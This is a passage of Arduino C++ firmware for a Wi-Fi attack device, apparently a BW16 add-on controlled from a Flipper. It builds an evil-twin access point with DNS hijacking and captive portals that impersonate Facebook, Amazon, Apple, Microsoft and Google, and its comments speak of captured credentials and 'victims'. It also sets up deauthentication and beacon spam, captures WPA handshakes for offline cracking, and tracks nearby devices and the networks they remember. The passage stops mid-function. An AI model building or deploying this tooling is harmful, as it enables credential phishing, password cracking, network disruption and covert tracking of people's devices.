#include "vector"
#include "wifi_conf.h"
#include "wifi_cust_tx.h"
#include "wifi_drv.h"   // arduino_wifi_mode_check (Arduino's private mode cache)
#include "wifi_drv.h"
#include "debug.h"
#include "WiFi.h"
#include <BLEDevice.h>
#include <BLEAdvertData.h>
#include <BLEHIDDevice.h>
#include <BLEHIDKeyboard.h>

//Captive portals
#include "portals/compressed/facebook.h"
#include "portals/compressed/amazon.h"
#include "portals/compressed/apple.h"
#include "portals/compressed/microsoft.h"
#include "portals/compressed/google.h"
#include "portals/default.h"

enum portals{
  Default,
  Facebook,
  Amazon,
  Apple,
  Microsoft,
  Google,
  Custom
};


//DNS

#include "dns.h"
#include "dhcp_captive.h"
#include <lwip/lwip_v2.0.2/src/include/lwip/priv/tcp_priv.h>

// Stop the SDK's built-in DHCP server (in lib_arduino.a) so our option-114 server
// can own UDP:67. Declared here to avoid pulling the whole dhcps.h.
extern "C" void dhcps_deinit(void);

#define MIN(a, b) ((a) < (b) ? (a) : (b))

#define BAUD 115200

//PORTALS




typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint8_t channel;
  int security;
} WiFiScanResult;


const char* rick_roll[8] = {
      "01 Never gonna give you up",
      "02 Never gonna let you down",
      "03 Never gonna run around",
      "04 and desert you",
      "05 Never gonna make you cry",
      "06 Never gonna say goodbye",
      "07 Never gonna tell a lie",
      "08 and hurt you"
};

// BEACONSPAM GHOST: a rotating set of "ghost"-flavoured SSIDs (5Ghost's Ghost AP Beacon).
static const char* ghost_ssids[8] = {
      "5Ghost", "Ghost_AP", "Free WiFi", "PINGEQUA",
      "GhostNet", "FreeWifi", "Ghost AP", "Connect"
};


std::vector<WiFiScanResult> scan_results;
volatile bool scan_done = false;  // set by scanResultHandler when the driver reports completion
std::vector<int> deauth_wifis, wifis_temp;
//WiFiServer server(80);
uint8_t deauth_bssid[6];
uint16_t deauth_reason = 2;
bool randomSSID, rickroll, ghostSpam;
char randomString[19];
int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 36, 40, 44, 48, 149, 153, 157, 161};
int portal=0;
// C2: rotate the served portal on every captured credential (so successive victims get
// different pages). Toggled from the host with PORTALROT <0|1>.
static bool portal_rot = false;
int localPortNew=1000;
char wpa_pass[64];
char ap_channel[4];
bool secured=false;
//"00:E0:4C:01:02:03"
__u8 customMac[8]={0x00,0xE0,0x4C,0x01,0x02,0x03,0x00,0x00};
bool useCustomMac=false;
// Captive-portal host: a NAME derived from the AP SSID ("Free_Wifi" -> freewifi.com) so
// the portal is served as http://<host>/ instead of a bare IP. The DNS hijack resolves
// <host> (and every other name) to the AP, so DHCP option 114, the 302 Location and
// /cp.json all advertise this host.
char portalHost[64] = "portal.com";
char portalUrl[80]  = "http://portal.com/";
char cpUri[96]      = "http://portal.com/cp.json";

void build_portal_urls(const char* ssid){
  char s[48]; int n = 0;
  for (int i = 0; ssid && ssid[i] && n < 47; i++) {
    char c = ssid[i];
    if (c >= '0' && c <= '9')      s[n++] = c;
    else if (c >= 'a' && c <= 'z') s[n++] = c;
    else if (c >= 'A' && c <= 'Z') s[n++] = (char)(c - 'A' + 'a');
    // drop spaces, underscores, dots and anything else that is not [a-z0-9]
  }
  s[n] = 0;
  if (n == 0) strcpy(s, "portal");
  snprintf(portalHost, sizeof(portalHost), "%s.com", s);
  snprintf(portalUrl,  sizeof(portalUrl),  "http://%s/", portalHost);
  snprintf(cpUri,      sizeof(cpUri),      "http://%s/cp.json", portalHost);
  Serial.print("PORTAL host: "); Serial.println(portalHost);
}
//int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11};
extern u8 rtw_get_band_type(void);
// De rTV: wifi_get_ch_from_channel_set() is declared in wifi_conf.h but is NOT in this build's
// archive (undefined reference), so the channel-set query goes through the private ioctl instead.
// These two are present, checked with strings on the linked libraries before building.
extern int wifi_get_channel_plan(uint8_t *channel_plan);
extern int wext_private_command_with_retval(const char* ifname, char* cmd, char* ret, int len);
extern int wifi_change_channel_plan(uint8_t channel_plan);
#define FRAMES_PER_DEAUTH 5

// DFS (radar) 5GHz channels: RX-only, never TX deauth here (5Ghost does the same).
static bool is_dfs_channel(int ch) {
  return (ch >= 52 && ch <= 64) || (ch >= 100 && ch <= 144);
}

static int hexnib(char c) {
  if (c >= '0' && c <= '9') return c - '0';
  if (c >= 'a' && c <= 'f') return c - 'a' + 10;
  if (c >= 'A' && c <= 'F') return c - 'A' + 10;
  return -1;
}
String generateRandomString(int len){
  String randstr = "";
  const char setchar[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  for (int i = 0; i < len; i++){
    int index = random(0,strlen(setchar));
    randstr += setchar[index];

  }
  return randstr;
}

String parseRequest(String request) {
  int path_start = request.indexOf(' ') + 1;
  int path_end = request.indexOf(' ', path_start);
  return request.substring(path_start, path_end);
}

//DNS
bool apActive = false;

// Custom portal: HTML streamed from the Flipper (SD file) via PORTALHTML hex chunks.
static char customPortal[8192];
static volatile uint16_t customPortalLen = 0;


int status = WL_IDLE_STATUS;   

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete != 0) {
    scan_done = true;   // driver signalled completion -> all results are in
    return RTW_SUCCESS;
  }
  {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    if(result.ssid.length()==0)result.ssid = String("<empty>");
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    
    memcpy(&result.bssid, &record->BSSID, 6);
    // (no bssid_str here: it pointed at a local -> dangling. The LIST output formats the
    //  MAC itself with %02X, so the pointer was never needed.)
    result.security = record->security;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}
WiFiServer server(80);
bool serveBegined =false;


void createAP(char* ssid, char* channel, char* password){
  int mode;
  // The driver cannot sniff and run a softAP at once: with a promiscuous callback still registered
  // (any of the scan/handshake/tracker/IDS features leaves one behind) apbegin() fails with
  // "ioctl[RTKIOCSIWFREQ] error / Operation failed!" and the AP never comes up - which is exactly
  // the softAP bug we chased. The KARMA path already did this stop before calling createAP; doing it
  // here means no caller can forget it again.
  wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
  // The AP must come up in AP mode, and that is the whole softAP bug we chased. apbegin() only does
  // arduino_wifi_mode_check |= 0x10, so it never clears the sticky STA/concurrent bit left by any
  // earlier scanning; wifiDriverInit() then picks RTW_MODE_STA_AP and the channel set inside
  // apActivate() fails with "ioctl[RTKIOCSIWFREQ] error / Operation failed!". Note the trap: setting
  // the channel directly on the running interface succeeds *while in STA mode* - success there says
  // nothing about the AP-mode path, which is why three attempts at promisc/mode/pre-setting all
  // missed. Assign (do not OR) the mode: apbegin's own re-init then picks RTW_MODE_AP.
  {
    int want = atoi(channel);
    if(want < 1 || want > 165) want = 6;
    snprintf(ap_channel, sizeof(ap_channel), "%d", want);   // keep the request authoritative
    arduino_wifi_mode_check = 0x10;                          // discard the concurrent/STA bits
    // That one assignment IS the mode fix: apbegin() -> WiFiDrv::wifiDriverInit() reads this
    // cache (0x10 -> RTW_MODE_AP) and, when it disagrees with the driver's current mode, runs
    // its own dhcps_deinit(); wifi_off(); wifi_on(RTW_MODE_AP). We used to repeat that restart
    // here by hand: redundant (apbegin does it right afterwards anyway), it only widened the
    // window where WLAN0 is down (wext_get_mode printed "WLAN 0 0 / netif is DOWN" plus
    // ioctl[RTKIOCGIWMODE] error), and its checks were wrong - wifi_off()/wifi_on() return
    // non-zero on SUCCESS in this SDK, so the log read "wifi_off failed / wifi_on(AP) failed"
    // while both calls had actually worked. Misleading enough to send us after the wrong bug.
    wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
  }
  const char* ifname = WLAN0_NAME;
  wext_get_mode(ifname, &mode);

  Serial.print("WLAN 0 ");
  Serial.println(mode);

  ifname = WLAN1_NAME;
  wext_get_mode(ifname, &mode);
  Serial.print("WLAN 1 ");
  Serial.println(mode);


  DEBUG_SER_PRINT("CREATING AP");
  DEBUG_SER_PRINT(ssid);
  DEBUG_SER_PRINT(channel);
  // status is a GLOBAL that still holds WL_CONNECTED from any earlier AP in this session.
  // Without this reset the retry loop below is skipped on a 2nd start: apbegin() is never
  // called, the AP that the mode change just took down is never restarted, and we still set
  // apActive=true with HTTP/DHCP/DNS up - EXACTLY the "AP starts, servers run, nothing on the
  // air" symptom we chased. Reset it and test the FRESH result.
  status = WL_IDLE_STATUS;
  int tries = 0;
  while (status != WL_CONNECTED && tries < 6) {
    DEBUG_SER_PRINT("CREATING AP 2");
      if(strcmp(password,"")==0){
        status = WiFi.apbegin(ssid, channel, (uint8_t) 0);
      }else{
        status = WiFi.apbegin(ssid, password, channel, (uint8_t) 0);
      }
      if(status == WL_CONNECTED) break;
      delay(1000);
      tries++;
  }
  if(status != WL_CONNECTED) {
    // Bounded retry: this loop used to be infinite, so a failed apbegin wedged loop() forever
    // (no commands, no TX, no portal). Bail out instead and leave apActive alone.
    DEBUG_SER_PRINT("AP FAILED");
    return;
  }
  // Replace the SDK DHCP server with ours so we can advertise option 114 (RFC 8910),
  // which is what actually triggers Android 11+ captive-portal auto-open.
  dhcps_deinit();
  // The AP interface is chosen by the same rule the core's apActivate() uses: with our forced
  // 0x10 mode cache that is WLAN0/xnetif[0]; 0x11 (concurrent) would be xnetif[1].
  start_DHCP_Server(cpUri, (arduino_wifi_mode_check == 0x11) ? 1 : 0);

  unbind_dns();
  delay(1000);

  //Creamos un nuevo servicio de dns
  start_DNS_Server();
  if(!serveBegined){
    server.begin();
    serveBegined=true;
  }
  apActive = true;
  ifname = WLAN0_NAME;
  wext_get_mode(ifname, &mode);

  Serial.print("WLAN 0 ");
  Serial.println(mode);

  ifname = WLAN1_NAME;
  wext_get_mode(ifname, &mode);
  Serial.print("WLAN 1 ");
  Serial.println(mode);
}
void createAP(char* ssid, char* channel){

  createAP(ssid, channel, "");
}
void destroyAP(){
  // Tear our own servers down BEFORE the wifi_off/wifi_on below, while lwip is still
  // alive (calling udp_remove on a pcb freed by the re-init would be a use-after-free).
  // Without this the 2nd+ AP start of a session is broken:
  //  - the HTTP listen socket dies with the WiFi re-init, but serveBegined stays true,
  //    so server.begin() is never called again -> every accept() fails -> no portal.
  //  - start_DHCP_Server() early-returns on dhcp_pcb != NULL, so retarget_ap_netif()
  //    is skipped -> AP sits on the driver default subnet while DHCP advertises
  //    192.168.4.1 -> client has no reachable gateway (and option 114's /cp.json
  //    is unreachable, so Android never auto-opens the portal).
  stop_DHCP_Server();     // dhcp_pcb = NULL -> next start_DHCP_Server() retargets + rebinds
  serveBegined = false;   // -> next createAP() re-opens the HTTP listen socket
  delay(500);
  WiFiClient client = server.available();
  while(client.connected()){
    DEBUG_SER_PRINT("PArando cliente");
    DEBUG_SER_PRINT(client);
    client.flush();
    client.stop();
    client = server.available();
  }
  apActive=false;
  delay(500);
  wifi_off();
  delay(500);
  WiFiDrv::wifiDriverInit();
  wifi_on(RTW_MODE_STA_AP);
  status = WL_IDLE_STATUS;   
  delay(500);
  WiFi.enableConcurrent();

  WiFi.status();
  int channel;
  wifi_get_channel(&channel);



}


String makeResponse(int code, String content_type, bool compresed, size_t content_length) {
  // Well-formed HTTP is required: Android/iOS captive detection ignores malformed
  // responses (bare LF, no Content-Length). CRLF + Content-Length mirrors stock 5Ghost.
  const char *reason = (code == 302) ? "Found" : (code == 404) ? "Not Found" : "OK";
  String response = "HTTP/1.1 " + String(code) + " " + reason + "\r\n";
  if(compresed)
  response += "Content-Encoding: gzip\r\n";
  response += "Content-Type: " + content_type + "\r\n";
  response += "Content-Length: " + String(content_length) + "\r\n";
  response += "Cache-Control: no-store\r\n";
  response += "Connection: close\r\n\r\n";
  return response;
}

// 302 to the portal root — this is what makes Android's generate_204 / iOS probes fire the
// "Sign in to network" flow. Stock 5Ghost uses exactly this; DHCP option 114 is NOT needed.
void handleRedirect(WiFiClient &client) {
  String response = "HTTP/1.1 302 Found\r\n";
  response += "Location: " + String(portalUrl) + "\r\n";
  response += "Content-Length: 0\r\n";
  response += "Cache-Control: no-store\r\n";
  response += "Connection: close\r\n\r\n";
  client.write(response.c_str());
}

// Per-client captive state: once a client submits the portal form it's "authorized",
// and we answer ITS OS connectivity probes with 204 (No Content) so the
// "Connected, no internet" warning clears. Un-authorized clients still get a 302 to
// the portal, so it keeps popping for new victims. Peer IP via WiFiClient::remoteIP()
// (core patch -> lwip_getpeername).
static uint32_t authed_ips[16];
static uint8_t authed_n = 0;
bool ip_is_authed(uint32_t ip) { for (uint8_t i = 0; i < authed_n; i++) if (authed_ips[i] == ip) return true; return false; }
void ip_mark_authed(uint32_t ip) { if (ip && !ip_is_authed(ip)) { authed_ips[authed_n % 16] = ip; if (authed_n < 16) authed_n++; } }

void handle204(WiFiClient &client) {
  // 204 = probe succeeded -> OS marks the network validated and drops the warning.
  client.write("HTTP/1.1 204 No Content\r\nContent-Length: 0\r\nCache-Control: no-store\r\nConnection: close\r\n\r\n");
}

void handle404(WiFiClient &client) {
  String body = "Not found!";
  String response = makeResponse(404, "text/plain", false, body.length());
  response += body;
  client.write(response.c_str());
}


void handleRequest(WiFiClient &client,enum portals portalType,String ssid){
  const char *webPage;
  size_t len;
  bool compresed = false;
  switch(portalType){
    case Default:
      webPage = default_web(ssid);
      len = strlen(webPage);
      break;
    case Facebook:
      webPage = (const char*)facebook;
      len = facebook_len;
      break;
    case Amazon:
      webPage = (const char*)amazon;
      len = amazon_len;
      break;
    case Apple:
      webPage = (const char *)apple;
      len = apple_len;
      break;
    case Google:
      webPage = (const char *)google;
      len = google_len;
      break;
    case Microsoft:
      webPage = (const char *)microsoft;
      len = microsoft_len;
      break;
    case Custom:
      webPage = customPortal;
      len = customPortalLen;
      break;
    default:
      webPage = default_web(ssid);
  }
  Serial.print("Heap libre header:");
  Serial.println(xPortGetFreeHeapSize());
  if(webPage[0]==0x1f && webPage[1]==0x8b){
    compresed=true;
  }
  
  String response = makeResponse(200, "text/html", compresed, len);
  client.write(response.c_str());
  
   

  size_t chunkSize = 5000;

  for (size_t i = 0; i < len; i += chunkSize) {
        size_t sendSize = MIN(chunkSize, len - i);
        while(client.available()){
            client.read();
            delay(10);
            }
            Serial.print("Heap libre write:");
        Serial.println(xPortGetFreeHeapSize());
        if(client.connected()){
          client.write((const uint8_t *)(webPage + i), sendSize);
          if(client.getWriteError())return;
        }else{
          return;
        }
        delay(1);
  }

  delay(10);
   while(client.available()){
            client.read();
            delay(1);
            }
}

int scanNetworks(int miliseconds) {
  DEBUG_SER_PRINT("Scanning WiFi networks ("+(String)miliseconds+" ms)...\n");
  scan_results.clear();
  scan_done = false;
  DEBUG_SER_PRINT("wifi get band type:"+(String)wifi_get_band_type()+"\n");
  DEBUG_SER_PRINT("scan results cleared...");
  
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    digitalWrite(LED_B,false);
    // Wait for the DRIVER's completion signal (scan_done), not a fixed delay: the scan
    // routinely takes longer than `miliseconds`, and a premature SCAN:OK made the host's
    // immediately-following LIST race the results -> empty/partial list.
    uint32_t t0 = millis();
    uint32_t maxwait = (uint32_t)miliseconds + 5000u;
    while (!scan_done && (millis() - t0) < maxwait) {
      digitalWrite(LED_G, !digitalRead(LED_G));
      delay(100);
    }
    digitalWrite(LED_B,true);
    DEBUG_SER_PRINT(" done! n="+(String)scan_results.size()+"\n");
    return 0;
  } else {
    DEBUG_SER_PRINT(" failed!\n");
    return 1;
  }
}
String readString;

void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);
  
  Serial.begin(BAUD);
  Serial1.begin(BAUD);
  readString.reserve(50);
  DEBUG_SER_PRINT("Iniciando\n");
  
  WiFi.enableConcurrent();
  WiFi.status();
  int channel;
  wifi_get_channel(&channel);

  digitalWrite(LED_B, HIGH);
}
String ssid="";
uint32_t current_num = 0;

// --- F5: macro recording ---------------------------------------------------------------
// The board sees every command the app sends, in order, so it can record them itself. The app
// later fetches the list (RECFETCH) and saves it as a runnable F1 script, which means a macro is
// produced just by using the app normally. Housekeeping traffic (polls, handshakes, the
// recorder's own commands) is filtered out so the script only contains real actions.
#define REC_MAX 20
#define REC_LINE_LEN 48
static bool rec_on = false;
static char rec_lines[REC_MAX][REC_LINE_LEN];
static int rec_n = 0;

static void rec_note(const String& cmd) {
  if(!rec_on || rec_n >= REC_MAX) return;
  String c = cmd;
  c.replace("\n", "");
  if(c.length() == 0 || c.length() >= REC_LINE_LEN - 1) return;
  if(c.startsWith("REC")) return;          // the recorder's own commands
  if(c.startsWith("HELLO") || c.startsWith("PING")) return;
  if(c.startsWith("KARMALIST") || c.startsWith("TRAPSTAT") || c.startsWith("PORTALHASH")) return;
  strncpy(rec_lines[rec_n], c.c_str(), REC_LINE_LEN - 1);
  rec_lines[rec_n][REC_LINE_LEN - 1] = '\0';
  rec_n++;
  Serial1.print("RECN:");
  Serial1.println(rec_n);                  // live count, so the app can show progress
}

// --- Promisc spike (GATE test): does the BW16 driver actually deliver data/EAPOL
// frames to the promisc callback, or only mgmt? If data+EAPOL flow, handshake/PMKID/
// station-enum ports are feasible; if not, they're off the table. RTW_PROMISC_ENABLE
// + len_used=1 delivers Ethernet frames, so EAPOL shows up as ethertype 0x888e. ---
static volatile uint32_t pm_total = 0, pm_mgmt = 0, pm_ctrl = 0, pm_data = 0, pm_eapol = 0;

// --- P5: WPA 4-way handshake capture -------------------------------------------
// When `hs_cap` is set, every EAPOL (802.1X) data frame seen on the monitored channel
// is copied verbatim (full 802.11 header, no FCS) into a small RAM ring. After the
// capture window we stream the raw frames over Serial/Serial1 as `HSFRAME:<hex>` lines
// so the host can rebuild a LINKTYPE_IEEE802_11 pcap (see firmware-build/hs_to_pcap.py).
// Gate result proving this is viable: ch2 -> total=1208 mgmt=750 data=458 eapol=0
// (data/metrics flow; eapol=0 only because no full 4-way occurred in the passive window).
#define HS_MAX 12          // frames kept per capture (a full 4-way is 4)
#define HS_FRAME_MAX 256   // per-frame byte cap
static volatile bool hs_cap = false;
static volatile uint16_t hs_count = 0;
static uint8_t hs_frames[HS_MAX][HS_FRAME_MAX];
static uint16_t hs_lens[HS_MAX];

// RTW_PROMISC_ENABLE_2 (raw 802.11): buf[0] = frame control. type bits (buf[0]>>2)&3:
// 0=mgmt 1=ctrl 2=data. EAPOL rides in a data frame after the 802.11 hdr + LLC/SNAP,
// ethertype 0x888e at offset 30 (non-QoS) or 32 (QoS data).
static void promisc_spike_cb(unsigned char *buf, unsigned int len, void *userdata) {
  (void)userdata;
  if (len < 1) return;
  pm_total++;
  uint8_t ftype = (buf[0] >> 2) & 0x3;
  if (ftype == 0) pm_mgmt++;
  else if (ftype == 1) pm_ctrl++;
  else if (ftype == 2) {
    pm_data++;
    if ((len >= 32 && buf[30] == 0x88 && buf[31] == 0x8e) ||
        (len >= 34 && buf[32] == 0x88 && buf[33] == 0x8e)) {
      pm_eapol++;
      // Keep the whole frame (M1..M4) for offline cracking. memcpy only — this runs in
      // the driver/WiFi task, so no String/heap work here.
      if (hs_cap && hs_count < HS_MAX) {
        uint16_t n = (len < HS_FRAME_MAX) ? (uint16_t)len : (uint16_t)HS_FRAME_MAX;
        memcpy(hs_frames[hs_count], buf, n);
        hs_lens[hs_count] = n;
        hs_count++;
      }
    }
  }
}

// Dump the captured EAPOL frames as hex lines the host tool turns into a .pcap.
static void hs_stream(int ch) {
  uint16_t n = hs_count;
  String hdr = "HSCAP: ch=" + String(ch) + " count=" + String((unsigned)n);
  Serial.println(hdr); Serial1.println(hdr);
  for (uint16_t i = 0; i < n; i++) {
    String line = "HSFRAME:";
    line.reserve(2 * hs_lens[i] + 12);
    for (uint16_t j = 0; j < hs_lens[i]; j++) {
      char b[3];
      snprintf(b, sizeof(b), "%02x", hs_frames[i][j]);
      line += b;
    }
    Serial.println(line); Serial1.println(line);
  }
  String fin = "HSDONE:" + String((unsigned)n);
  Serial.println(fin); Serial1.println(fin);
}

// --- P1: channel hop ---
static volatile bool hopping = false;
static volatile uint32_t hop_interval_ms = 500;
static const uint8_t hop_channels[] = {1,2,3,4,5,6,7,8,9,10,11,12,13};

// --- P2: PMF/WPA3 classification from the RSN IE of beacons / probe responses ---
// The scan API (rtw_scan_result_t, wifi_structures.h) exposes only a coarse security
// bitmask, so 802.11w MFP required/capable and SAE must be read from the RSN IE
// (tag 48). We harvest it from promisc and report per-BSSID. RSN capabilities bits:
// B6 = MFPR (required), B7 = MFPC (capable). AKM suite type 8 = SAE, 9 = FT-SAE.
#define PMF_MAX_APS 16
typedef struct {
  uint8_t bssid[6];
  char ssid[33];
  uint16_t caps;  // RSN capabilities
  uint8_t sae;    // SAE / FT-SAE present
  uint8_t n_akm;
} pmf_ap_t;
static pmf_ap_t pmf_aps[PMF_MAX_APS];
static volatile uint8_t pmf_n = 0;

static void pmf_parse(const uint8_t* f, unsigned len) {
  if (len < 36) return;
  uint8_t st = (f[0] >> 4) & 0xF;
  if (st != 8 && st != 5) return;           // beacon / probe response only
  const uint8_t* bssid = f + 16;            // addr3 == BSSID
  char ssid[33];
  ssid[0] = 0;
  uint16_t rcaps = 0;
  int have_rsn = 0, sae = 0, nakm = 0;
  unsigned i = 36;                          // 24-byte mgmt hdr + 12-byte fixed params
  while (i + 2 <= len) {
    uint8_t id = f[i], l = f[i + 1];
    unsigned d = i + 2;
    if (d + l > len) break;
    if (id == 0) {                          // SSID
      uint8_t n = l < 32 ? l : 32;
      memcpy(ssid, f + d, n);
      ssid[n] = 0;
    } else if (id == 48 && l >= 8) {        // RSN IE
      unsigned p = d + 2;                   // skip version
      p += 4;                               // group cipher suite
      if (p + 2 <= d + l) {
        uint16_t pc = f[p] | (f[p + 1] << 8);
        p += 2 + 4 * (unsigned)pc;          // pairwise count + suites
      }
      if (p + 2 <= d + l) {
        uint16_t ac = f[p] | (f[p + 1] << 8);
        p += 2;
        for (int k = 0; k < ac && p + 4 <= d + l; k++, p += 4) {
          uint8_t t = f[p + 3];
          if (t == 8 || t == 9) sae = 1;
          nakm++;
        }
      }
      if (p + 2 <= d + l) rcaps = f[p] | (f[p + 1] << 8);
      have_rsn = 1;
    }
    i = d + l;
  }
  if (!have_rsn) return;
  for (uint8_t k = 0; k < pmf_n; k++)
    if (!memcmp(pmf_aps[k].bssid, bssid, 6)) return;   // already seen
  if (pmf_n >= PMF_MAX_APS) return;
  pmf_ap_t* a = &pmf_aps[pmf_n];
  memcpy(a->bssid, bssid, 6);
  memcpy(a->ssid, ssid, sizeof(a->ssid));
  a->caps = rcaps;
  a->sae = sae;
  a->n_akm = nakm;
  pmf_n++;
}

static void promisc_pmf_cb(unsigned char* buf, unsigned int len, void* userdata) {
  (void)userdata;
  pmf_parse(buf, len);
}

static void pmf_stream(int ch) {
  for (uint8_t k = 0; k < pmf_n; k++) {
    pmf_ap_t* a = &pmf_aps[k];
    const char* mfp = (a->caps & 0x0040) ? "req" : (a->caps & 0x0080) ? "cap" : "no";
    char line[128];
    snprintf(line, sizeof(line),
      "PMF:%02X:%02X:%02X:%02X:%02X:%02X|%s|akm=%u|sae=%u|mfp=%s",
      a->bssid[0], a->bssid[1], a->bssid[2], a->bssid[3], a->bssid[4], a->bssid[5],
      a->ssid, (unsigned)a->n_akm, (unsigned)a->sae, mfp);
    Serial.println(line); Serial1.println(line);
  }
  String fin = "PMFDONE: ch=" + String(ch) + " aps=" + String((unsigned)pmf_n);
  Serial.println(fin); Serial1.println(fin);
}

// --- P4: STASCAN — enumerate stations associated to a BSSID from promisc ------
// No RSSI here: the promisc callback only gets (buf, len) — the driver strips the
// radiotap header — so we report MAC + frame count only.
#define STA_MAX 24
typedef struct { uint8_t mac[6]; uint16_t count; } sta_t;
static sta_t sta_list[STA_MAX];
static volatile uint8_t sta_n = 0;
static uint8_t sta_filter[6];
static volatile bool sta_filter_on = false;

static void sta_add(const uint8_t* mac) {
  for (uint8_t i = 0; i < sta_n; i++)
    if (!memcmp(sta_list[i].mac, mac, 6)) { sta_list[i].count++; return; }
  if (sta_n >= STA_MAX) return;
  memcpy(sta_list[sta_n].mac, mac, 6);
  sta_list[sta_n].count = 1;
  sta_n++;
}

static void promisc_sta_cb(unsigned char* buf, unsigned int len, void* ud) {
  (void)ud;
  if (len < 24) return;
  uint8_t ftype = (buf[0] >> 2) & 3;
  uint8_t st = (buf[0] >> 4) & 0xF;
  uint8_t tods = buf[1] & 0x01, fromds = (buf[1] >> 1) & 0x01;
  const uint8_t *a1 = buf + 4, *a2 = buf + 10, *a3 = buf + 16;
  const uint8_t* sta = NULL;
  if (ftype == 2) {                                    // data
    if (tods && !fromds) { if (sta_filter_on && memcmp(a1, sta_filter, 6)) return; sta = a2; }
    else if (!tods && fromds) { if (sta_filter_on && memcmp(a2, sta_filter, 6)) return; sta = a1; }
    else return;                                       // IBSS / WDS — ambiguous
  } else if (ftype == 0) {                             // mgmt: auth(11)/assoc-req(0)/reassoc-req(2)
    if (st != 11 && st != 0 && st != 2) return;
    if (sta_filter_on && memcmp(a3, sta_filter, 6)) return;
    sta = a2;
  } else return;
  if (sta && !(sta[0] & 0x01)) sta_add(sta);           // skip multicast/broadcast
}

// --- A2: client tracker ----------------------------------------------------------
// Timeline of the devices seen on a channel: any probe/auth/assoc/data frame identifies a device,
// and we keep MAC -> first seen, last seen, how often. This SDK's promisc callback carries no
// RSSI, so v1 tracks presence and timing only. TRACK <chan> [secs] streams
// CLI:<mac>|<first-s>|<last-s>|<count> and ends with CLIDONE:<n>.
#define CLI_MAX 10
typedef struct { uint8_t mac[6]; uint16_t first; uint16_t last; uint16_t count; } cli_t;
static cli_t cli_list[CLI_MAX];
static volatile uint8_t cli_n = 0;
static volatile bool cli_on = false;
static uint32_t cli_base = 0;      // millis() at the window start; times are stored in seconds
// A2 RSSI: settled 2026-10-16 - the promisc callback buffer is the bare frame with its 4-byte FCS
// still attached and NO rx_info appended, so there is nothing to read an RSSI from. Measured over
// 107 frames on channel 7: the last four bytes (the FCS) spanned mn 00 12 00 00 .. mx F0 FC FD EE,
// i.e. nearly the whole byte range. A real RSSI sits in a narrow band and never jumps like that.
// Per-device RSSI therefore needs another mechanism; per-AP RSSI already comes from SCAN.

static void cli_add(const uint8_t* mac) {
  uint16_t now = (uint16_t)((millis() - cli_base) / 1000UL);
  for(uint8_t i = 0; i < cli_n; i++) {
    if(!memcmp(cli_list[i].mac, mac, 6)) {
      cli_list[i].last = now;
      if(cli_list[i].count < 65535) cli_list[i].count++;
      return;
    }
  }
  if(cli_n >= CLI_MAX) return;
  memcpy(cli_list[cli_n].mac, mac, 6);
  cli_list[cli_n].first = now;
  cli_list[cli_n].last = now;
  cli_list[cli_n].count = 1;
  cli_n++;
}

static void promisc_cli_cb(unsigned char* buf, unsigned int len, void* ud) {
  (void)ud;
  if(!cli_on || len < 24) return;
  uint8_t ftype = (buf[0] >> 2) & 3;
  uint8_t st = (buf[0] >> 4) & 0xF;
  uint8_t tods = buf[1] & 0x01, fromds = (buf[1] >> 1) & 0x01;
  const uint8_t *a1 = buf + 4, *a2 = buf + 10;
  const uint8_t* dev = NULL;
  if(ftype == 0) {                                  // mgmt
    if(st == 4 || st == 11 || st == 0 || st == 2) dev = a2;   // probe-req/auth/assoc/reassoc
  } else if(ftype == 2) {                           // data
    if(tods && !fromds) dev = a2;
    else if(!tods && fromds) dev = a1;
    else return;                                    // IBSS / WDS - ambiguous
  } else return;
  if(dev && !(dev[0] & 0x01)) cli_add(dev);         // skip multicast/broadcast
}

static void cli_stream(int ch) {
  for(uint8_t i = 0; i < cli_n; i++) {
    char line[80];
    snprintf(
      line,
      sizeof(line),
      "CLI:%02X:%02X:%02X:%02X:%02X:%02X|%u|%u|%u",
      cli_list[i].mac[0],
      cli_list[i].mac[1],
      cli_list[i].mac[2],
      cli_list[i].mac[3],
      cli_list[i].mac[4],
      cli_list[i].mac[5],
      (unsigned)cli_list[i].first,
      (unsigned)cli_list[i].last,
      (unsigned)cli_list[i].count);
    Serial.println(line); Serial1.println(line);
  }
  String fin = "CLIDONE: ch=" + String(ch) + " n=" + String((unsigned)cli_n);
  Serial.println(fin); Serial1.println(fin);
}

static void sta_stream(int ch) {
  for (uint8_t i = 0; i < sta_n; i++) {
    char line[64];
    snprintf(line, sizeof(line), "STA:%02X:%02X:%02X:%02X:%02X:%02X|%u",
      sta_list[i].mac[0], sta_list[i].mac[1], sta_list[i].mac[2],
      sta_list[i].mac[3], sta_list[i].mac[4], sta_list[i].mac[5],
      (unsigned)sta_list[i].count);
    Serial.println(line); Serial1.println(line);
  }
  String fin = "STADONE: ch=" + String(ch) + " n=" + String((unsigned)sta_n);
  Serial.println(fin); Serial1.println(fin);
}

// --- A1: probe-request sniffer / PNL extraction --------------------------------
// Devices broadcast probe requests naming the SSIDs they remember (their Preferred
// Network List). We log each sender's MAC + the requested SSID(s) so the Flipper can build
// a "known networks" inventory (recon / audit). Directed probes carry the SSID; wildcard
// probes reveal only the client. RSSI is not delivered to the promisc callback.
#define PROBE_MAX 12
typedef struct { uint8_t mac[6]; uint8_t n; char ssid[2][33]; } probe_t;
static probe_t probes[PROBE_MAX];
static uint8_t probe_n = 0;

static void probe_add(const uint8_t* mac, const char* ssid) {
  int idx = -1;
  for(uint8_t i = 0; i < probe_n; i++)
    if(!memcmp(probes[i].mac, mac, 6)) { idx = i; break; }
  if(idx < 0) {
    if(probe_n >= PROBE_MAX) return;
    idx = probe_n++;
    memcpy(probes[idx].mac, mac, 6);
    probes[idx].n = 0;
  }
  if(ssid && ssid[0]) {
